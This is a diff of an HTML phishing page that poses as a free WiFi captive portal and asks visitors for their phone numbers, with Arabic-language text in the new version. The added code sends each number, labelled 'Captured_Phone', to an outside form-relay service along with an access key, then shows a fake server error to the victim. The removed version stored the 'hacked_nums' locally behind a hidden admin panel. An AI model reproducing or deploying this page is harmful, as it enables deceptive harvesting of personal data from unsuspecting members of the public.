@@ -1,60 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>WiFi Portal - Rakan</title>
+    <meta charset="UTF-8">
+    <title>WiFi Connect</title>
     <style>
-        body { background-color: #e9ecef; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .box { background: white; padding: 30px; border-radius: 15px; width: 320px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
-        h2 { color: #007bff; }
-        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
-        button { background: #007bff; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .admin-link { margin-top: 20px; font-size: 10px; color: #eee; cursor: pointer; }
+        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 320px; text-align: center; }
+        h2 { color: #1877f2; }
+        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: center; }
     </style>
 </head>
 <body>
-
-    <div class="box" id="mainBox">
-        <h2>Free WiFi</h2>
-        <p>Enter phone number to connect</p>
-        <input type="text" id="userPhone" placeholder="05xxxxxxxx">
-        <button onclick="saveAndSend()">CONNECT NOW</button>
+    <div class="box">
+        <h2>WiFi Free 📶</h2>
+        <p>أدخل رقم جوالك للاتصال بالشبكة</p>
+        <input type="text" id="phone_number" placeholder="05xxxxxxxx">
+        <button onclick="sendData()">اتصال الآن</button>
     </div>
-
-    <div class="box" id="adminBox" style="display:none;">
-        <h2 style="color:red;">Rakan Admin Panel</h2>
-        <p>Captured Numbers:</p>
-        <div id="resultList" style="background:#f8f9fa; padding:10px; border:1px solid #ccc; text-align:left; font-family:monospace;">
-            No numbers yet...
-        </div>
-        <br>
-        <button onclick="showLogin()" style="background:#6c757d;">Back</button>
-    </div>
-
-    <div class="admin-link" onclick="showAdmin()">.</div>
 
     <script>
-        function saveAndSend() {
-            var phone = document.getElementById("userPhone").value;
-            if(phone == "") { alert("Please enter a number!"); return; }
+        function sendData() {
+            var user_phone = document.getElementById("phone_number").value;
+            if(user_phone.length < 10) { alert("الرقم غير صحيح!"); return; }
 
-            // ��� ����� �� ����� ������
-            var existing = localStorage.getItem("hacked_nums") || "";
-            localStorage.setItem("hacked_nums", existing + phone + "<br>");
+            var formData = new FormData();
+            formData.append("access_key", "d1cb687e-4ff2-4e81-8613-25f31db37452");
+            formData.append("Captured_Phone", user_phone);
 
-            alert("Connecting to WiFi... Please wait.");
-            document.getElementById("userPhone").value = "";
-        }
-
-        function showAdmin() {
-            document.getElementById("mainBox").style.display = "none";
-            document.getElementById("adminBox").style.display = "block";
-            var data = localStorage.getItem("hacked_nums");
-            if(data) document.getElementById("resultList").innerHTML = data;
-        }
-
-        function showLogin() {
-            document.getElementById("adminBox").style.display = "none";
-            document.getElementById("mainBox").style.display = "block";
+            fetch("https://api.web3forms.com/submit", {
+                method: "POST",
+                body: formData
+            }).then(function() {
+                alert("خطأ: السيرفر لا يستجيب، حاول لاحقاً.");
+                location.reload();
+            });
         }
     </script>
 </body>
